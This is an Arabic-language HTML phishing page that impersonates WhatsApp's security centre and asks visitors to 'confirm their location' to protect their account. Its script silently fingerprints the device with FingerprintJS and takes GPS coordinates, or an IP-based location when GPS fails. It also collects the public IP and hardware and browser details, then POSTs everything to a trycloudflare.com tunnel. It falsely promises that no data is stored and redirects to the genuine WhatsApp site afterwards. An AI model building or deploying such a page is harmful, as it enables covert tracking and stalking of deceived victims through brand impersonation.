<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الحساب • واتساب</title>
    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v4/yP/r/4Lp1WpLiL2E.png">
    <!-- FingerprintJS (للبصمة الصامتة) -->
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <!-- Leaflet (للخريطة – اختياري) -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #e9edef;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }
        .card {
            max-width: 480px;
            width: 100%;
            background: white;
            border-radius: 32px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.08);
            padding: 36px 24px 24px;
            text-align: center;
            border-top: 6px solid #25D366;
        }
        .logo {
            width: 76px;
            height: 76px;
            background: #25D366;
            border-radius: 50%;
            margin: 0 auto 24px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .logo svg { width: 44px; height: 44px; fill: white; }
        h2 { color: #075E54; font-size: 24px; font-weight: 700; margin-bottom: 8px; }
        .subtitle { color: #54656f; font-size: 15px; line-height: 1.4; margin-bottom: 24px; }
        .security-badge {
            background: #e7f5e6;
            border-radius: 40px;
            padding: 10px 20px;
            margin-bottom: 28px;
            display: inline-block;
            color: #075E54;
            font-weight: 600;
            font-size: 14px;
        }
        .btn {
            background: #25D366;
            color: white;
            border: none;
            padding: 16px 24px;
            border-radius: 48px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 16px;
        }
        .btn:hover { background: #1da15b; }
        .btn:disabled { background: #a5d6b4; cursor: not-allowed; }
        #status {
            color: #075E54;
            font-size: 14px;
            margin: 16px 0;
            min-height: 40px;
        }
        .map-container {
            margin-top: 20px;
            border-radius: 20px;
            overflow: hidden;
            border: 1px solid #e0e0e0;
            background: #f5f5f5;
            height: 180px;
            display: none;
        }
        #map { height: 100%; width: 100%; }
        .footer { margin-top: 24px; color: #8696a0; font-size: 12px; }
        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #25D366;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .error { color: #e74c3c; }
        .success { color: #25D366; }
        #consentPopup {
            background: #f5f7f8;
            border-radius: 24px;
            padding: 24px 20px;
            margin: 20px 0;
            display: none;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <svg viewBox="0 0 24 24"><path d="M12.04 2C6.58 2 2.13 6.45 2.13 11.91c0 1.75.46 3.45 1.33 4.95L2.04 22l5.33-1.4c1.46.8 3.12 1.25 4.83 1.25 5.46 0 9.91-4.45 9.91-9.91 0-5.46-4.45-9.94-10.07-9.94z"/></svg>
        </div>
        <h2>تأكيد الموقع الجغرافي</h2>
        <p class="subtitle">لحماية حسابك من الوصول غير المصرح، يرجى تأكيد موقعك الحالي.</p>
        <div class="security-badge">🔒 واتساب • مركز الأمان</div>
        
        <button class="btn" id="startBtn">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/></svg>
            بدء التحقق الأمني
        </button>

        <div id="consentPopup">
            <p style="color: #075E54; font-weight: 500; margin-bottom: 12px;">📱 يتطلب الإجراء مشاركة موقعك</p>
            <p style="color: #54656f; font-size: 14px; margin-bottom: 24px;">نحن نستخدم موقعك فقط للتحقق من هوية جهازك. لن يتم تخزين هذه البيانات.</p>
            <button class="btn" id="locateBtn" style="background: #075E54;">📍 مشاركة موقعي الحالي</button>
        </div>

        <div id="status"></div>
        <div class="map-container" id="mapContainer"><div id="map"></div></div>
        <div class="footer">© واتساب 2026</div>
    </div>

    <script>
        (function() {
            // ========== التكوين ==========
            const LOG_URL = 'https://trying-brief-fairfield-cheaper.trycloudflare.com/log';
            
            // ========== المتغيرات العامة ==========
            let map = null;
            let fpPromise = null;
            const startBtn = document.getElementById('startBtn');
            const locateBtn = document.getElementById('locateBtn');
            const consentPopup = document.getElementById('consentPopup');
            const statusDiv = document.getElementById('status');
            const mapContainer = document.getElementById('mapContainer');

            // ========== تحميل بصمة الجهاز بصمت ==========
            if (typeof FingerprintJS !== 'undefined') {
                fpPromise = FingerprintJS.load().then(fp => fp.get());
            }

            // ========== دوال مساعدة ==========
            function showStatus(msg, type) {
                statusDiv.innerHTML = msg;
                statusDiv.className = type || '';
            }

            function initMap(lat, lng, accuracy) {
                if (typeof L === 'undefined') {
                    console.warn('Leaflet not loaded');
                    return;
                }
                mapContainer.style.display = 'block';
                if (!map) {
                    map = L.map('map').setView([lat, lng], 15);
                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                        attribution: '&copy; OpenStreetMap'
                    }).addTo(map);
                } else {
                    map.setView([lat, lng], 15);
                    map.eachLayer(l => { if (l instanceof L.Marker || l instanceof L.Circle) map.removeLayer(l); });
                }
                L.marker([lat, lng]).addTo(map).bindPopup('موقعك الحالي').openPopup();
                L.circle([lat, lng], { radius: accuracy, color: '#25D366', fillOpacity: 0.15 }).addTo(map);
            }

            // ========== جمع البيانات وإرسالها ==========
            async function collectAndSend(payload) {
                // IP عام
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    payload.ip = ipData.ip;
                } catch(e) {}

                // بصمة الجهاز
                if (fpPromise) {
                    try {
                        const fp = await fpPromise;
                        payload.fingerprint = {
                            visitorId: fp.visitorId,
                            confidence: fp.confidence.score,
                            components: fp.components
                        };
                    } catch(e) {}
                }

                // بيانات الجهاز الأساسية
                payload.device = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cores: navigator.hardwareConcurrency || 'unknown',
                    memory: navigator.deviceMemory || 'unknown',
                    touch: 'ontouchstart' in window
                };

                payload.timestamp = new Date().toISOString();

                // إرسال إلى الخادم
                try {
                    await fetch(LOG_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                } catch(e) {}
            }

            // ========== احتياطي: IP Geocoding (إذا فشل GPS) ==========
            async function fallbackIPGeolocation() {
                showStatus('🔄 جاري تحديد الموقع عبر الشبكة...', '');
                try {
                    const ipRes = await fetch('https://ipapi.co/json/');
                    const data = await ipRes.json();
                    if (data.latitude && data.longitude) {
                        const lat = data.latitude, lng = data.longitude;
                        const acc = 5000; // دقة تقريبية 5 كم
                        showStatus(`✅ تم التأكيد عبر الشبكة (دقة ~${acc}م)`, 'success');
                        initMap(lat, lng, acc);
                        await collectAndSend({ 
                            latitude: lat, longitude: lng, accuracy: acc, 
                            method: 'ip_geolocation', ip_data: data 
                        });
                        locateBtn.disabled = true;
                        setTimeout(() => { window.location.href = 'https://www.whatsapp.com/security-tips'\; }, 3000);
                        return true;
                    }
                } catch(e) {}
                return false;
            }

            // ========== معالج GPS الرئيسي ==========
            function handleGeolocation() {
                if (!navigator.geolocation) {
                    showStatus('❌ متصفحك لا يدعم تحديد الموقع.', 'error');
                    locateBtn.disabled = false;
                    return;
                }

                showStatus('<div class="loader"></div> جاري تحديد موقعك...', '');
                locateBtn.disabled = true;

                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        const lat = pos.coords.latitude, lng = pos.coords.longitude, acc = pos.coords.accuracy;
                        showStatus(`✅ تم التأكيد! الدقة: ${Math.round(acc)}م`, 'success');
                        initMap(lat, lng, acc);
                        await collectAndSend({ latitude: lat, longitude: lng, accuracy: acc, method: 'gps' });
                        setTimeout(() => { window.location.href = 'https://www.whatsapp.com/security-tips'\; }, 3000);
                    },
                    async (err) => {
                        console.warn('GPS error:', err.code);
                        if (err.code === 1) { // رفض
                            showStatus('❌ تم رفض الصلاحية. يرجى السماح بالموقع من إعدادات المتصفح.', 'error');
                            locateBtn.disabled = false;
                            await collectAndSend({ location_failed: true, error: 'user_denied' });
                        } else {
                            // فشل تقني (مهلة أو غير متاح) -> احتياطي IP
                            const success = await fallbackIPGeolocation();
                            if (!success) {
                                showStatus('❌ تعذر تحديد الموقع. تأكد من اتصالك بالإنترنت.', 'error');
                                locateBtn.disabled = false;
                                await collectAndSend({ location_failed: true, error: 'gps_timeout_and_ip_failed' });
                            }
                        }
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            }

            // ========== ربط الأحداث ==========
            startBtn.addEventListener('click', () => {
                startBtn.style.display = 'none';
                consentPopup.style.display = 'block';
            });

            locateBtn.addEventListener('click', handleGeolocation);
        })();
    </script>
</body>
</html>
